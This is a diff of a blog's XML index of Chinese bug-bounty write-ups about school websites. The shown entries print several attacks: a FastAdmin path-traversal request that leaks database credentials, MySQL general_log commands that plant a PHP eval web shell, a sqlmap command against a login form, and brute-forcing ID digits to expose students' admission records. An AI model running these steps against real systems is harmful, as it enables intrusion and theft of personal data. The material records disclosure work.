@@ -8,7 +8,7 @@
     <link href="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/"/>
     <url>/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/</url>
     
-    <content type="html"><![CDATA[<p>好久没挖eduSRC了，拿了一台Win的Shell，值得写一下</p><span id="more"></span><p>在鹰图逛资产的过程中，发现了一个中学的后台管理页面，爆破密码，Fuzz接口，扫描后台均无果</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916191013020.png" class=""><p>准备放弃的时候，用Kscan扫了一下端口，意外发现了同IP的8001端口下有<code>FastAdmin</code>，访问一下，发现页面存在</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916191421744.png" class=""><p>用任意文件读取漏洞Nday打了一下，爆出了数据库名和密码</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/index/ajax/lang?lang=../../application/database</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br></code></pre></td></tr></table></figure><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916191734858.png" class=""><p>使用<code>DBeaver</code>连接MySQL数据库，发现大量敏感数据，</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916192018761.png" class=""><p>得到了管理员的密码，虽然是MD5之后的，反查一下发现是弱密码，</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916192128687.png" class=""><p>登陆管理后台，</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916192159345.png" class=""><p>到这里还没有结束，我尝试在文件上传处GetShell，但是失败了，文件后缀会被重写，无果。</p><p>既然我们已经拿到了MySQL的root权限，只需要知道根路径就行了，正好<code>FastAdmin</code>页面发送报错提供了这一信息，同时可以在MySQL中执行SQL命令验证，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;<br></code></pre></td></tr></table></figure><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916192512566.png" class=""><p>那么使用MySQL慢查询写入Shell，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs MySQL">select @@basedir;<br>show variables like '%general%';<br>set global general_log = on;<br>set global general_log_file = 'D:/WWWSC/www/public/api.php';<br>select '&lt;?php eval($_REQUEST["x"]);?&gt;';<br></code></pre></td></tr></table></figure><p>成功：</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916192626629.png" class="">]]></content>
+    <content type="html"><![CDATA[<p>好久没挖eduSRC了，拿了一台Win的Shell，值得写一下</p><span id="more"></span><p>在鹰图逛资产的过程中，发现了一个中学的后台管理页面，爆破密码，Fuzz接口，扫描后台均无果</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916191013020.png" class=""><p>准备放弃的时候，用Kscan扫了一下端口，意外发现了同IP的8001端口下有<code>FastAdmin</code>，访问一下，发现页面存在</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916191421744.png" class=""><p>用任意文件读取漏洞Nday打了一下，爆出了数据库名和密码</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/index/ajax/lang?lang=../../application/database</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br></code></pre></td></tr></table></figure><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916195402169.png" class="" title="image-20240916195402169"><p>使用<code>DBeaver</code>连接MySQL数据库，发现大量敏感数据，</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916192018761.png" class=""><p>得到了管理员的密码，虽然是MD5之后的，反查一下发现是弱密码，</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916192128687.png" class=""><p>登陆管理后台，</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916192159345.png" class=""><p>到这里还没有结束，我尝试在文件上传处GetShell，但是失败了，文件后缀会被重写，无果。</p><p>既然我们已经拿到了MySQL的root权限，只需要知道根路径就行了，正好<code>FastAdmin</code>页面发送报错提供了这一信息，同时可以在MySQL中执行SQL命令验证，</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> @<span class="hljs-variable">@basedir</span>;<br></code></pre></td></tr></table></figure><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916192512566.png" class=""><p>那么使用MySQL写日志功能，写入Shell，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs MySQL">select @@basedir;<br>show variables like '%general%';<br>set global general_log = on;<br>set global general_log_file = 'D:/WWWSC/www/public/api.php';<br>select '&lt;?php eval($_REQUEST["x"]);?&gt;';<br></code></pre></td></tr></table></figure><p>成功连接：</p><img src="/2024/09/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%8EFastAdmin%E5%88%B0GetShell/image-20240916192626629.png" class="">]]></content>
     
     
     <categories>
@@ -21,8 +21,6 @@
     <tags>
       
       <tag>SRC</tag>
-      
-      <tag>SQL注入</tag>
       
     </tags>
     
@@ -1037,8 +1035,6 @@
       
       <tag>SRC</tag>
       
-      <tag>SQL注入</tag>
-      
     </tags>
     
   </entry>
@@ -1075,7 +1071,7 @@
     <link href="/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/"/>
     <url>/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/</url>
     
-    <content type="html"><![CDATA[<p>一次有意思的教育SRC逻辑漏洞</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这次挖到一个有意思的逻辑漏洞👍</p><p>在挖掘教育SRC时，我们可以关注到一个必然存在交互的地方，那就是录取查询，这里必然是有一个查询框，所以可以测一测</p><h3 id="某职业学院的录取查询页面"><a href="#某职业学院的录取查询页面" class="headerlink" title="某职业学院的录取查询页面"></a>某职业学院的录取查询页面</h3><p><a href="http://xxx.xxx.edu.cn/lqcx.htm">http://xxx.xxx.edu.cn/lqcx.htm</a></p><img src="/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/Snipaste_2023-08-31_22-41-26.png" class=""><p>可以发现这里的查询很简单，只要输入身份证的后8位即可查询到录取信息，所以这里我们不妨抓个包试试，发现是明文传输数据，好家伙，这里可以打打SQL注入，打了，没有哈哈</p><h3 id="存在逻辑缺陷"><a href="#存在逻辑缺陷" class="headerlink" title="存在逻辑缺陷"></a>存在逻辑缺陷</h3><p>点击查询后抓包，修改参数<code>sfh8w</code>，试一试是不是可以获取别人的信息</p><p>那我改一下身份证后4位然后爆破，然后，居然真有，还这么多</p><img src="/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/Snipaste_2023-08-31_22-46-05.png" class=""><p>输一个查询试试，可以发现虽然中间8位打了马，但是查询的时候用了后8位，相当于只打了4位的马，然后呢，身份证嘛，那打码的4位，猜都猜得到，2004-2006，试试就行了</p><img src="/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/Snipaste_2023-08-31_22-44-30.png" class=""><p>然后，这里也不能叫越权吧，应该算是设计上的缺陷，只凭身份证后8位就可以查询信息了哈哈</p><p>交了，中危👍👍</p><img src="/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/Snipaste_2023-08-31_22-52-30.png" class="">]]></content>
+    <content type="html"><![CDATA[<p>一次有意思的eduSRC逻辑漏洞</p><span id="more"></span><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>这次挖到一个有意思的逻辑漏洞👍</p><p>在挖掘教育SRC时，我们可以关注到一个必然存在交互的地方，那就是录取查询，这里必然是有一个查询框，所以可以测一测</p><h3 id="某职业学院的录取查询页面"><a href="#某职业学院的录取查询页面" class="headerlink" title="某职业学院的录取查询页面"></a>某职业学院的录取查询页面</h3><p><a href="http://xxx.xxx.edu.cn/lqcx.htm">http://xxx.xxx.edu.cn/lqcx.htm</a></p><img src="/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/Snipaste_2023-08-31_22-41-26.png" class=""><p>可以发现这里的查询很简单，只要输入身份证的后8位即可查询到录取信息，所以这里我们不妨抓个包试试，发现是明文传输数据，好家伙，这里可以打打SQL注入，打了，没有哈哈</p><h3 id="存在逻辑缺陷"><a href="#存在逻辑缺陷" class="headerlink" title="存在逻辑缺陷"></a>存在逻辑缺陷</h3><p>点击查询后抓包，修改参数<code>sfh8w</code>，试一试是不是可以获取别人的信息</p><p>那我改一下身份证后4位然后爆破，然后，居然真有，还这么多</p><img src="/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/Snipaste_2023-08-31_22-46-05.png" class=""><p>输一个查询试试，可以发现虽然中间8位打了马，但是查询的时候用了后8位，相当于只打了4位的马，然后呢，身份证嘛，那打码的4位，猜都猜得到，2004-2006，试试就行了</p><img src="/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/Snipaste_2023-08-31_22-44-30.png" class=""><p>然后，这里也不能叫越权吧，应该算是设计上的缺陷，只凭身份证后8位就可以查询信息了哈哈</p><p>交了，中危👍👍</p><img src="/2023/08/31/%E4%B8%80%E4%B8%AA%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/Snipaste_2023-08-31_22-52-30.png" class="">]]></content>
     
     
     <categories>
@@ -1088,8 +1084,6 @@
     <tags>
       
       <tag>SRC</tag>
-      
-      <tag>逻辑漏洞</tag>
       
     </tags>
     
@@ -1116,35 +1110,6 @@
       
       <tag>SRC</tag>
       
-      <tag>路由器</tag>
-      
-    </tags>
-    
-  </entry>
-  
-  
-  
-  <entry>
-    <title>SQL注入Tips</title>
-    <link href="/2023/08/24/SQL%E6%B3%A8%E5%85%A5Tips/"/>
-    <url>/2023/08/24/SQL%E6%B3%A8%E5%85%A5Tips/</url>
-    
-    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="2b4faae67aedb53964df37e1f8b4f14bc3e4ba61df61d728013e5e339c716cdc">80f7af2430a3dce6996ee26d1569b2385785aa33a6061cd475f185de95ee54bc9670dd650fd44e9a49af16f05d26d297d805ed54d9c3687ae600ad34af8b36d6f1dc66d7937c883eba64075652197d753d3a90b495f8a96b01f62198064cdce016098f75dacbabb0921c4b70820ecd20d185335f9e99a1e090d54a5475d2c78d5f0e46b4128c2b50248ac876a9c8c3fc3825d5ca30661f77cedf9750de2daf0182edebecd0d8233bf4c6781eb99dfdb3f675f6de3f2dc6295112d8f1dd56102728a19ff029d6c2ea63acbf5b37a377c1135820c5b87a092646e3f60550301897</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-    
-    
-    <categories>
-      
-      <category>SRC</category>
-      
-    </categories>
-    
-    
-    <tags>
-      
-      <tag>SRC</tag>
-      
-      <tag>SQL注入</tag>
-      
     </tags>
     
   </entry>
@@ -1156,7 +1121,7 @@
     <link href="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/"/>
     <url>/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/</url>
     
-    <content type="html"><![CDATA[<p>幸运儿，登陆框发现SQL注入🤣</p><span id="more"></span><h3 id="Google语法找目标"><a href="#Google语法找目标" class="headerlink" title="Google语法找目标"></a>Google语法找目标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">intext:后台登录  inurl:login.php -canvas -十合一全网营销方案<br></code></pre></td></tr></table></figure><h3 id="发现登录页面"><a href="#发现登录页面" class="headerlink" title="发现登录页面"></a>发现登录页面</h3><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-20_18-16-54.png" class=""><p>抓包，</p><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-20_18-22-15.png" class=""><p>首先测试弱口令爆破，</p><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-20_18-18-37.png" class=""><p>没有🤣</p><h3 id="发现存在SQL注入"><a href="#发现存在SQL注入" class="headerlink" title="发现存在SQL注入"></a>发现存在SQL注入</h3><p>通过手工测试发现存在SQL语句报错，传统艺能之跑<code>sqlmap</code>，保存请求包到txt文件，使用命令：<code>python sqlmap.py -r "./test.txt" --threads=10 --tamper=between --time-sec=2 --dbms=mysql --union-char=a --dbs</code>，还真跑出来了😎</p><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-20_18-23-17.png" class=""><p>跑个数据名和表名作为证据：</p><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-20_18-25-55.png" class=""><p>点到为止就可以提交到平台</p><p>一个妥妥的高危😊😊</p><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-31_23-04-41.png" class="">]]></content>
+    <content type="html"><![CDATA[<p>幸运儿，登陆框发现SQL注入，乐</p><span id="more"></span><h3 id="Google语法找目标"><a href="#Google语法找目标" class="headerlink" title="Google语法找目标"></a>Google语法找目标</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">intext:后台登录  inurl:login.php -canvas -十合一全网营销方案<br></code></pre></td></tr></table></figure><h3 id="发现登录页面"><a href="#发现登录页面" class="headerlink" title="发现登录页面"></a>发现登录页面</h3><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-20_18-16-54.png" class=""><p>抓包，</p><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-20_18-22-15.png" class=""><p>首先测试弱口令爆破，</p><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-20_18-18-37.png" class=""><p>没有🤣</p><h3 id="发现存在SQL注入"><a href="#发现存在SQL注入" class="headerlink" title="发现存在SQL注入"></a>发现存在SQL注入</h3><p>通过手工测试发现存在SQL语句报错，传统艺能之跑<code>sqlmap</code>，保存请求包到txt文件，使用命令：<code>python sqlmap.py -r "./test.txt" --threads=10 --tamper=between --time-sec=2 --dbms=mysql --union-char=a --dbs</code>，还真跑出来了😎</p><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-20_18-23-17.png" class=""><p>跑个数据名和表名作为证据：</p><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-20_18-25-55.png" class=""><p>点到为止就可以提交到平台</p><p>一个妥妥的高危😊😊</p><img src="/2023/08/20/%E7%BD%95%E8%A7%81%E7%9A%84%E7%99%BB%E5%BD%95%E6%A1%86%E5%87%BA%E7%8E%B0SQL%E6%B3%A8%E5%85%A5/Snipaste_2023-08-31_23-04-41.png" class="">]]></content>
     
     
     <categories>
@@ -1169,8 +1134,6 @@
     <tags>
       
       <tag>SRC</tag>
-      
-      <tag>SQL注入</tag>
       
     </tags>
     
@@ -1224,8 +1187,6 @@
       
       <tag>SRC</tag>
       
-      <tag>技巧</tag>
-      
     </tags>
     
   </entry>
@@ -1277,8 +1238,6 @@
     <tags>
       
       <tag>SRC</tag>
-      
-      <tag>Thinkphp</tag>
       
     </tags>
     
